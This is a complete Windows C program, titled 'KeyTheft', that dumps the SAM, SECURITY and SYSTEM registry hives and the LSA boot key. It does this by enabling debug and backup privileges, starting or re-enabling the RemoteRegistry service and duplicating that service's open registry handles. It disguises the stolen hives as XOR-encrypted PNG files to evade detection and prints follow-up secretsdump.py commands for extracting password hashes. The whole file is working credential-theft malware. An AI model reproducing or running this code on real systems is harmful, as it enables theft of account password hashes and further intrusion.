#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>
#include <io.h>
#include <fcntl.h>

#pragma comment(lib, "advapi32.lib")

typedef LONG NTSTATUS;
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#define STATUS_BUFFER_TOO_SMALL ((NTSTATUS)0xC0000023L)

#define SystemExtendedHandleInformation 64

typedef enum _KEY_INFORMATION_CLASS {
    KeyBasicInformation = 0,
    KeyNodeInformation,
    KeyFullInformation,
    KeyNameInformation
} KEY_INFORMATION_CLASS;

typedef struct _KEY_NAME_INFORMATION {
    ULONG NameLength;
    WCHAR Name[1];
} KEY_NAME_INFORMATION, *PKEY_NAME_INFORMATION;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
    PVOID       Object;
    ULONG_PTR   UniqueProcessId;
    ULONG_PTR   HandleValue;
    ULONG       GrantedAccess;
    USHORT      CreatorBackTraceIndex;
    USHORT      ObjectTypeIndex;
    ULONG       HandleAttributes;
    ULONG       Reserved;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX {
    ULONG_PTR NumberOfHandles;
    ULONG_PTR Reserved;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, *PSYSTEM_HANDLE_INFORMATION_EX;

typedef NTSTATUS (NTAPI *fn_NtQuerySystemInformation)(
    ULONG, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *fn_NtDuplicateObject)(
    HANDLE, HANDLE, HANDLE, PHANDLE, ACCESS_MASK, ULONG, ULONG);
typedef NTSTATUS (NTAPI *fn_NtQueryKey)(
    HANDLE, KEY_INFORMATION_CLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *fn_NtSaveKey)(HANDLE, HANDLE);
typedef NTSTATUS (NTAPI *fn_NtClose)(HANDLE);
typedef BOOLEAN  (WINAPI *fn_RtlGenRandom)(PVOID, ULONG);

static fn_NtQuerySystemInformation pNtQuerySystemInformation;
static fn_NtDuplicateObject        pNtDuplicateObject;
static fn_NtQueryKey                pNtQueryKey;
static fn_NtSaveKey                 pNtSaveKey;
static fn_NtClose                   pNtClose;

static const WCHAR SAM_PATH[] = L"\\REGISTRY\\MACHINE\\SAM";
static const ULONG SAM_PATH_LEN = 21;

static const WCHAR SECURITY_PATH[] = L"\\REGISTRY\\MACHINE\\SECURITY";
static const ULONG SECURITY_PATH_LEN = 26;

static const BYTE PNG_SIG[8] = {
    0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A
};

static const BYTE PNG_IHDR[25] = {
    0x00,0x00,0x00,0x0D,
    0x49,0x48,0x44,0x52,
    0x00,0x00,0x00,0x01,
    0x00,0x00,0x00,0x01,
    0x08,
    0x06,
    0x00,0x00,0x00,
    0x54,0x3F,0x55,0x64
};

#define PNG_HDR_SIZE  (sizeof(PNG_SIG) + sizeof(PNG_IHDR))
#define XOR_KEY_SIZE  16

static BOOL DisguiseAsImage(LPCWSTR srcPath, LPCWSTR dstPath,
                             const BYTE xorKey[XOR_KEY_SIZE])
{
    HANDLE hIn = CreateFileW(srcPath, GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hIn == INVALID_HANDLE_VALUE) return FALSE;

    DWORD dataSize = GetFileSize(hIn, NULL);
    if (dataSize == INVALID_FILE_SIZE || dataSize == 0) {
        CloseHandle(hIn);
        return FALSE;
    }

    BYTE *data = (BYTE *)HeapAlloc(GetProcessHeap(), 0, dataSize);
    if (!data) { CloseHandle(hIn); return FALSE; }

    DWORD rd;
    if (!ReadFile(hIn, data, dataSize, &rd, NULL) || rd != dataSize) {
        HeapFree(GetProcessHeap(), 0, data);
        CloseHandle(hIn);
        return FALSE;
    }
    CloseHandle(hIn);

    for (DWORD i = 0; i < dataSize; i++)
        data[i] ^= xorKey[i % XOR_KEY_SIZE];

    HANDLE hOut = CreateFileW(dstPath, GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOut == INVALID_HANDLE_VALUE) {
        HeapFree(GetProcessHeap(), 0, data);
        return FALSE;
    }

    DWORD wr;
    BOOL ok = WriteFile(hOut, PNG_SIG,  sizeof(PNG_SIG),  &wr, NULL)
           && wr == sizeof(PNG_SIG)
           && WriteFile(hOut, PNG_IHDR, sizeof(PNG_IHDR), &wr, NULL)
           && wr == sizeof(PNG_IHDR)
           && WriteFile(hOut, data, dataSize, &wr, NULL)
           && wr == dataSize;
    CloseHandle(hOut);

    HeapFree(GetProcessHeap(), 0, data);

    if (!ok) {
        DeleteFileW(dstPath);
        return FALSE;
    }

    DeleteFileW(srcPath);

    wprintf(L"  [+] %ls (%lu bytes)\n", dstPath,
        (unsigned long)(dataSize + PNG_HDR_SIZE));
    return TRUE;
}

static void GenXorKey(BYTE key[XOR_KEY_SIZE])
{
    fn_RtlGenRandom pRtlGenRandom = (fn_RtlGenRandom)
        GetProcAddress(GetModuleHandleW(L"advapi32.dll"), "SystemFunction036");
    if (pRtlGenRandom && pRtlGenRandom(key, XOR_KEY_SIZE)) return;

    DWORD seed = GetTickCount() ^ (GetCurrentProcessId() << 16);
    for (int i = 0; i < XOR_KEY_SIZE; i++) {
        seed = seed * 1103515245 + 12345;
        key[i] = (BYTE)(seed >> 16);
    }
}

static BOOL WriteKeyFile(LPCWSTR dstPath, const BYTE key[XOR_KEY_SIZE])
{
    WCHAR keyPath[MAX_PATH];
    _snwprintf(keyPath, MAX_PATH, L"%ls.key", dstPath);
    keyPath[MAX_PATH - 1] = L'\0';

    HANDLE h = CreateFileW(keyPath, GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return FALSE;

    static const char HEXD[] = "0123456789abcdef";
    char hex[XOR_KEY_SIZE * 2 + 2];
    for (int i = 0; i < XOR_KEY_SIZE; i++) {
        hex[i * 2]     = HEXD[key[i] >> 4];
        hex[i * 2 + 1] = HEXD[key[i] & 0x0F];
    }
    hex[XOR_KEY_SIZE * 2]     = '\n';
    hex[XOR_KEY_SIZE * 2 + 1] = '\0';

    DWORD wr;
    BOOL ok = WriteFile(h, hex, (DWORD)strlen(hex), &wr, NULL) &&
              wr == (DWORD)strlen(hex);
    CloseHandle(h);
    return ok;
}

static BOOL InitNtApis(void)
{
    HMODULE h = GetModuleHandleW(L"ntdll.dll");
    if (!h) return FALSE;
    pNtQuerySystemInformation = (fn_NtQuerySystemInformation)
        GetProcAddress(h, "NtQuerySystemInformation");
    pNtDuplicateObject = (fn_NtDuplicateObject)
        GetProcAddress(h, "NtDuplicateObject");
    pNtQueryKey = (fn_NtQueryKey)GetProcAddress(h, "NtQueryKey");
    pNtSaveKey  = (fn_NtSaveKey) GetProcAddress(h, "NtSaveKey");
    pNtClose    = (fn_NtClose)   GetProcAddress(h, "NtClose");
    return pNtQuerySystemInformation && pNtDuplicateObject &&
           pNtQueryKey && pNtSaveKey && pNtClose;
}

static BOOL EnablePriv(LPCWSTR name)
{
    HANDLE hTok;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!OpenProcessToken(GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hTok))
        return FALSE;
    if (!LookupPrivilegeValueW(NULL, name, &luid)) {
        CloseHandle(hTok); return FALSE;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hTok, FALSE, &tp, sizeof(tp), NULL, NULL);
    BOOL ok = (GetLastError() == ERROR_SUCCESS);
    CloseHandle(hTok);
    return ok;
}

static USHORT GetKeyTypeIndex(void)
{
    HKEY hk;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE", 0,
            KEY_READ, &hk) != ERROR_SUCCESS)
        return 0;

    USHORT idx = 0;
    ULONG  sz  = 0x400000;
    PSYSTEM_HANDLE_INFORMATION_EX info = NULL;
    NTSTATUS st = STATUS_INFO_LENGTH_MISMATCH;

    do {
        info = (PSYSTEM_HANDLE_INFORMATION_EX)HeapAlloc(
            GetProcessHeap(), 0, sz);
        if (!info) break;
        st = pNtQuerySystemInformation(SystemExtendedHandleInformation,
                                       info, sz, NULL);
        if (st == STATUS_INFO_LENGTH_MISMATCH) {
            HeapFree(GetProcessHeap(), 0, info);
            info = NULL;
            sz *= 2;
        }
    } while (st == STATUS_INFO_LENGTH_MISMATCH && sz <= 0x40000000);

    if (NT_SUCCESS(st) && info) {
        DWORD myPid = GetCurrentProcessId();
        for (ULONG_PTR i = 0; i < info->NumberOfHandles; i++) {
            if (info->Handles[i].UniqueProcessId == (ULONG_PTR)myPid &&
                info->Handles[i].HandleValue == (ULONG_PTR)hk) {
                idx = info->Handles[i].ObjectTypeIndex;
                break;
            }
        }
    }
    if (info) HeapFree(GetProcessHeap(), 0, info);
    RegCloseKey(hk);
    return idx;
}

static BOOL StealAndSave(
    DWORD   targetPid,
    LPCWSTR keyPath,
    ULONG   keyPathLen,
    LPCWSTR outputFile,
    USHORT  keyTypeIdx,
    LPCWSTR label)
{
    HANDLE hProc = OpenProcess(PROCESS_DUP_HANDLE, FALSE, targetPid);
    if (!hProc) {
        wprintf(L"  [-] OpenProcess(%lu) failed: %lu\n",
            targetPid, GetLastError());
        return FALSE;
    }

    ULONG sz = 0x4000000;
    PSYSTEM_HANDLE_INFORMATION_EX info = NULL;
    NTSTATUS st;

    do {
        info = (PSYSTEM_HANDLE_INFORMATION_EX)HeapAlloc(
            GetProcessHeap(), 0, sz);
        if (!info) { CloseHandle(hProc); return FALSE; }
        st = pNtQuerySystemInformation(SystemExtendedHandleInformation,
                                       info, sz, NULL);
        if (st == STATUS_INFO_LENGTH_MISMATCH) {
            HeapFree(GetProcessHeap(), 0, info);
            info = NULL;
            sz *= 2;
            if (sz > 0x40000000) {
                CloseHandle(hProc); return FALSE;
            }
        }
    } while (st == STATUS_INFO_LENGTH_MISMATCH);

    if (!NT_SUCCESS(st)) {
        if (info) HeapFree(GetProcessHeap(), 0, info);
        CloseHandle(hProc);
        return FALSE;
    }

    wprintf(L"  [*] Scanning %llu handles for PID %lu...\n",
        (unsigned long long)info->NumberOfHandles, targetPid);

    HANDLE hFile = CreateFileW(outputFile, GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        wprintf(L"  [-] CreateFile(%ls) failed: %lu\n",
            outputFile, GetLastError());
        HeapFree(GetProcessHeap(), 0, info);
        CloseHandle(hProc);
        return FALSE;
    }

    BOOL found = FALSE;
    ULONG checked = 0;

    for (ULONG_PTR i = 0; i < info->NumberOfHandles && !found; i++) {
        SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX *e = &info->Handles[i];
        if (e->UniqueProcessId != (ULONG_PTR)targetPid)  continue;
        if (e->ObjectTypeIndex  != keyTypeIdx)            continue;
        if (!(e->GrantedAccess & (KEY_READ | GENERIC_READ))) continue;

        HANDLE hDup = NULL;
        st = pNtDuplicateObject(hProc, (HANDLE)e->HandleValue,
            GetCurrentProcess(), &hDup, 0, 0, DUPLICATE_SAME_ACCESS);
        if (!NT_SUCCESS(st) || !hDup) continue;
        checked++;

        ULONG need = 0;
        st = pNtQueryKey(hDup, KeyNameInformation, NULL, 0, &need);
        if (st != STATUS_BUFFER_TOO_SMALL || !need) {
            pNtClose(hDup);
            continue;
        }

        BYTE *buf = (BYTE *)HeapAlloc(GetProcessHeap(), 0, need);
        if (!buf) { pNtClose(hDup); continue; }

        st = pNtQueryKey(hDup, KeyNameInformation, buf, need, &need);
        if (NT_SUCCESS(st)) {
            PKEY_NAME_INFORMATION kni = (PKEY_NAME_INFORMATION)buf;
            ULONG chars = kni->NameLength / sizeof(WCHAR);
            if (chars == keyPathLen &&
                _wcsnicmp(kni->Name, keyPath, keyPathLen) == 0) {
                wprintf(L"  [+] FOUND %ls — handle 0x%llX access 0x%08lX\n",
                    label, (unsigned long long)e->HandleValue, e->GrantedAccess);
                st = pNtSaveKey(hDup, hFile);
                if (NT_SUCCESS(st)) {
                    found = TRUE;
                } else {
                    wprintf(L"  [!] NtSaveKey: 0x%08lX — trying next handle\n",
                        (ULONG)st);
                }
            }
        }
        HeapFree(GetProcessHeap(), 0, buf);
        pNtClose(hDup);
    }

    CloseHandle(hFile);
    HeapFree(GetProcessHeap(), 0, info);
    CloseHandle(hProc);

    if (!found) {
        wprintf(L"  [-] %ls handle not found (%lu keys checked)\n",
            label, checked);
        DeleteFileW(outputFile);
        return FALSE;
    }

    wprintf(L"  [+] %ls hive captured\n", label);
    return TRUE;
}

static DWORD GetServicePid(LPCWSTR svcName, DWORD *origStart,
                           BOOL *reconfigured, BOOL *startedByUs)
{
    *origStart     = 0;
    *reconfigured  = FALSE;
    *startedByUs   = FALSE;

    SC_HANDLE hScm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hScm) return 0;

    SC_HANDLE hSvc = OpenServiceW(hScm, svcName,
        SERVICE_QUERY_STATUS | SERVICE_START | SERVICE_QUERY_CONFIG |
        SERVICE_CHANGE_CONFIG);
    if (!hSvc) { CloseServiceHandle(hScm); return 0; }

    BYTE cfgBuf[4096];
    QUERY_SERVICE_CONFIGW *cfg = (QUERY_SERVICE_CONFIGW *)cfgBuf;
    DWORD cfgNeeded;
    if (QueryServiceConfigW(hSvc, cfg, sizeof(cfgBuf), &cfgNeeded))
        *origStart = cfg->dwStartType;

    SERVICE_STATUS_PROCESS ssp;
    DWORD needed;
    if (!QueryServiceStatusEx(hSvc, SC_STATUS_PROCESS_INFO,
            (BYTE *)&ssp, sizeof(ssp), &needed)) {
        CloseServiceHandle(hSvc); CloseServiceHandle(hScm);
        return 0;
    }

    if (ssp.dwCurrentState != SERVICE_RUNNING) {
        if (!StartServiceW(hSvc, 0, NULL)) {
            DWORD err = GetLastError();
            if (err == ERROR_SERVICE_DISABLED) {
                if (!ChangeServiceConfigW(hSvc, SERVICE_NO_CHANGE,
                        SERVICE_DEMAND_START, SERVICE_NO_CHANGE,
                        NULL, NULL, NULL, NULL, NULL, NULL, NULL)) {
                    wprintf(L"  [-] ChangeServiceConfig: %lu\n", GetLastError());
                    CloseServiceHandle(hSvc); CloseServiceHandle(hScm);
                    return 0;
                }
                *reconfigured = TRUE;
                if (!StartServiceW(hSvc, 0, NULL)) {
                    wprintf(L"  [-] StartService: %lu\n", GetLastError());
                    CloseServiceHandle(hSvc); CloseServiceHandle(hScm);
                    return 0;
                }
                *startedByUs = TRUE;
            } else if (err != ERROR_SERVICE_ALREADY_RUNNING) {
                wprintf(L"  [-] StartService: %lu\n", err);
                CloseServiceHandle(hSvc); CloseServiceHandle(hScm);
                return 0;
            }
        } else {
            *startedByUs = TRUE;
        }
        for (int t = 0; t < 20; t++) {
            Sleep(250);
            QueryServiceStatusEx(hSvc, SC_STATUS_PROCESS_INFO,
                (BYTE *)&ssp, sizeof(ssp), &needed);
            if (ssp.dwCurrentState == SERVICE_RUNNING) break;
        }
        if (ssp.dwCurrentState != SERVICE_RUNNING) {
            CloseServiceHandle(hSvc); CloseServiceHandle(hScm);
            return 0;
        }
    }

    DWORD pid = ssp.dwProcessId;
    CloseServiceHandle(hSvc);
    CloseServiceHandle(hScm);
    return pid;
}

static void RestoreService(LPCWSTR svcName, DWORD origStart,
                           BOOL reconfigured, BOOL startedByUs)
{
    if (!reconfigured && !startedByUs) return;

    SC_HANDLE hScm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hScm) return;
    SC_HANDLE hSvc = OpenServiceW(hScm, svcName, SERVICE_ALL_ACCESS);
    if (!hSvc) {
        wprintf(L"  [!] OpenService(restore): %lu\n", GetLastError());
        CloseServiceHandle(hScm);
        return;
    }

    if (startedByUs) {

        WCHAR sysdir[MAX_PATH], cmd[MAX_PATH + 80];
        GetSystemDirectoryW(sysdir, MAX_PATH);
        _snwprintf(cmd, MAX_PATH + 79, L"\"%ls\\sc.exe\" stop %ls",
            sysdir, svcName);
        cmd[MAX_PATH + 78] = L'\0';

        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE,
                CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            WaitForSingleObject(pi.hProcess, 10000);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
        } else {
            wprintf(L"  [!] sc.exe spawn failed: %lu\n", GetLastError());
        }

        SERVICE_STATUS_PROCESS ssp;
        DWORD needed;
        BOOL stopped = FALSE;
        for (int t = 0; t < 20; t++) {
            Sleep(250);
            if (!QueryServiceStatusEx(hSvc, SC_STATUS_PROCESS_INFO,
                    (BYTE *)&ssp, sizeof(ssp), &needed)) break;
            if (ssp.dwCurrentState == SERVICE_STOPPED) { stopped = TRUE; break; }
        }
        if (!stopped)
            wprintf(L"  [!] %ls still not stopped after restore\n", svcName);
    }
    if (reconfigured && origStart != SERVICE_DEMAND_START) {
        ChangeServiceConfigW(hSvc, SERVICE_NO_CHANGE, origStart,
            SERVICE_NO_CHANGE, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    }
    CloseServiceHandle(hSvc);
    CloseServiceHandle(hScm);
}

static BOOL ExtractBootKey(BYTE bootKey[16])
{
    static const LPCWSTR names[] = { L"JD", L"Skew1", L"GBG", L"Data" };
    static const BYTE perm[16] = {
        8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7
    };
    WCHAR hexBuf[64];
    ULONG pos = 0;

    for (int i = 0; i < 4; i++) {
        WCHAR path[256];
        _snwprintf(path, 256,
            L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\%ls", names[i]);
        path[255] = L'\0';
        HKEY hk;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, path, 0,
                KEY_READ, &hk) != ERROR_SUCCESS)
            return FALSE;
        WCHAR cls[64];
        DWORD clsLen = 64;
        LSTATUS r = RegQueryInfoKeyW(hk, cls, &clsLen, NULL,
            NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
        RegCloseKey(hk);
        if (r != ERROR_SUCCESS) return FALSE;
        for (DWORD j = 0; j < clsLen && pos < 32; j++)
            hexBuf[pos++] = cls[j];
    }
    hexBuf[pos] = L'\0';
    if (pos != 32) return FALSE;

    BYTE scrambled[16];
    for (int i = 0; i < 16; i++) {
        WCHAR pair[3] = { hexBuf[i * 2], hexBuf[i * 2 + 1], 0 };
        scrambled[i] = (BYTE)wcstoul(pair, NULL, 16);
    }
    for (int i = 0; i < 16; i++)
        bootKey[i] = scrambled[perm[i]];
    return TRUE;
}

int wmain(int argc, wchar_t *argv[])
{
    _setmode(_fileno(stdout), _O_U8TEXT);

    wprintf(L"\n");
    wprintf(L"  ╔═══════════════════════════════════════════════════════╗\n");
    wprintf(L"  ║  KeyTheft, SAM Dump via RemoteRegistry Handle Theft ║\n");
    wprintf(L"  ║  Output: XOR-encrypted PNG (no regf on disk)         ║\n");
    wprintf(L"  ╚═══════════════════════════════════════════════════════╝\n\n");

    LPCWSTR samOut = (argc > 1) ? argv[1] : L"sam.png";
    LPCWSTR sysOut = (argc > 2) ? argv[2] : L"system.png";
    LPCWSTR secOut = (argc > 3) ? argv[3] : NULL;
    BOOL secWanted = (secOut != NULL);

    WCHAR samTmp[MAX_PATH], sysTmp[MAX_PATH], secTmp[MAX_PATH];
    _snwprintf(samTmp, MAX_PATH, L"%ls.tmp", samOut);
    samTmp[MAX_PATH - 1] = L'\0';
    _snwprintf(sysTmp, MAX_PATH, L"%ls.tmp", sysOut);
    sysTmp[MAX_PATH - 1] = L'\0';
    if (secWanted) {
        _snwprintf(secTmp, MAX_PATH, L"%ls.tmp", secOut);
        secTmp[MAX_PATH - 1] = L'\0';
    }

    if (!InitNtApis()) {
        wprintf(L"[-] Failed to resolve ntdll exports\n");
        return 1;
    }
    if (!EnablePriv(L"SeDebugPrivilege")) {
        wprintf(L"[-] SeDebugPrivilege FAILED (run as Administrator)\n");
        return 1;
    }
    if (!EnablePriv(L"SeBackupPrivilege")) {
        wprintf(L"[-] SeBackupPrivilege FAILED\n");
        return 1;
    }
    wprintf(L"[+] Privileges enabled\n");

    USHORT keyType = GetKeyTypeIndex();
    if (!keyType) {
        wprintf(L"[-] Key type index detection failed\n");
        return 1;
    }
    wprintf(L"[+] Key type index: %u\n", keyType);

    wprintf(L"\n══ Remote hives (KeyProxy via RemoteRegistry) ══\n");

    DWORD origStart = 0;
    BOOL  svcReconf = FALSE, svcStarted = FALSE;
    DWORD svcPid = GetServicePid(L"RemoteRegistry", &origStart,
                                 &svcReconf, &svcStarted);
    if (!svcPid) {
        wprintf(L"  [-] RemoteRegistry service unavailable\n");
        return 1;
    }
    wprintf(L"  [+] RemoteRegistry svchost PID: %lu\n", svcPid);

    HKEY hRemote = NULL;
    if (RegConnectRegistryW(L"\\\\localhost",
            HKEY_LOCAL_MACHINE, &hRemote) != ERROR_SUCCESS) {
        wprintf(L"  [-] RegConnectRegistryW failed\n");
        return 1;
    }

    HKEY hHiveRemote = NULL;
    if (RegOpenKeyExW(hRemote, L"SAM", 0,
            KEY_READ, &hHiveRemote) != ERROR_SUCCESS) {
        wprintf(L"  [-] Remote SAM open failed\n");
        RegCloseKey(hRemote);
        return 1;
    }
    wprintf(L"  [+] SAM opened via RemoteRegistry RPC\n");

    BOOL samOk = StealAndSave(svcPid, SAM_PATH, SAM_PATH_LEN,
                              samTmp, keyType, L"SAM");
    RegCloseKey(hHiveRemote);

    BOOL secOk = FALSE;
    if (secWanted) {
        if (RegOpenKeyExW(hRemote, L"SECURITY", REG_OPTION_BACKUP_RESTORE,
                KEY_READ, &hHiveRemote) == ERROR_SUCCESS) {
            secOk = StealAndSave(svcPid, SECURITY_PATH, SECURITY_PATH_LEN,
                                 secTmp, keyType, L"SECURITY");
            RegCloseKey(hHiveRemote);
        } else {
            wprintf(L"  [-] Remote SECURITY open failed: %lu\n", GetLastError());
        }
    }

    RegCloseKey(hRemote);

    RestoreService(L"RemoteRegistry", origStart, svcReconf, svcStarted);

    wprintf(L"\n══ SYSTEM hive ══\n");
    BOOL sysOk = FALSE;
    HKEY hSys;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM", 0,
            KEY_READ, &hSys) == ERROR_SUCCESS) {
        HANDLE hf = CreateFileW(sysTmp, GENERIC_WRITE, 0, NULL,
            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hf != INVALID_HANDLE_VALUE) {
            NTSTATUS st = pNtSaveKey((HANDLE)hSys, hf);
            CloseHandle(hf);
            if (NT_SUCCESS(st)) {
                wprintf(L"  [+] SYSTEM hive captured\n");
                sysOk = TRUE;
            } else {
                wprintf(L"  [-] NtSaveKey: 0x%08lX\n", (ULONG)st);
                DeleteFileW(sysTmp);
            }
        }
        RegCloseKey(hSys);
    }

    wprintf(L"\n══ Encoding output ══\n");

    if (samOk) {
        BYTE samKey[XOR_KEY_SIZE];
        GenXorKey(samKey);
        samOk = DisguiseAsImage(samTmp, samOut, samKey);
        if (samOk) WriteKeyFile(samOut, samKey);
    }
    if (sysOk) {
        BYTE sysKey[XOR_KEY_SIZE];
        GenXorKey(sysKey);
        sysOk = DisguiseAsImage(sysTmp, sysOut, sysKey);
        if (sysOk) WriteKeyFile(sysOut, sysKey);
    }
    if (secWanted && secOk) {
        BYTE secKey[XOR_KEY_SIZE];
        GenXorKey(secKey);
        secOk = DisguiseAsImage(secTmp, secOut, secKey);
        if (secOk) WriteKeyFile(secOut, secKey);
    }

    wprintf(L"\n══ Boot key ══\n");
    BYTE bootKey[16];
    if (ExtractBootKey(bootKey)) {
        wprintf(L"  [+] Boot key: ");
        for (int i = 0; i < 16; i++) wprintf(L"%02x", bootKey[i]);
        wprintf(L"\n");
    }

    wprintf(L"\n╔══════════════════════════════════════════════════╗\n");
    wprintf(L"║  SAM:    %-40ls║\n", samOk  ? L"SUCCESS" : L"FAILED");
    wprintf(L"║  SYSTEM: %-40ls║\n", sysOk  ? L"SUCCESS" : L"FAILED");
    if (secWanted)
        wprintf(L"║  SECURITY: %-38ls║\n", secOk ? L"SUCCESS" : L"FAILED");
    wprintf(L"║  Format: PNG (XOR-encrypted, no regf on disk)   ║\n");
    wprintf(L"╚══════════════════════════════════════════════════╝\n");

    if (samOk || sysOk || (secWanted && secOk)) {
        wprintf(L"\n  Decode (keys saved alongside outputs):\n");
        if (samOk)
            wprintf(L"    python3 decode.py $(cat %ls.key) %ls\n", samOut, samOut);
        if (sysOk)
            wprintf(L"    python3 decode.py $(cat %ls.key) %ls\n", sysOut, sysOut);
        if (secWanted && secOk)
            wprintf(L"    python3 decode.py $(cat %ls.key) %ls\n", secOut, secOut);
        wprintf(L"    secretsdump.py -sam sam.hiv -system system.hiv -security security.hiv LOCAL\n\n");
    }

    DeleteFileW(samTmp);
    DeleteFileW(sysTmp);
    DeleteFileW(secTmp);

    return (samOk && sysOk && (!secWanted || secOk)) ? 0 : 1;
}
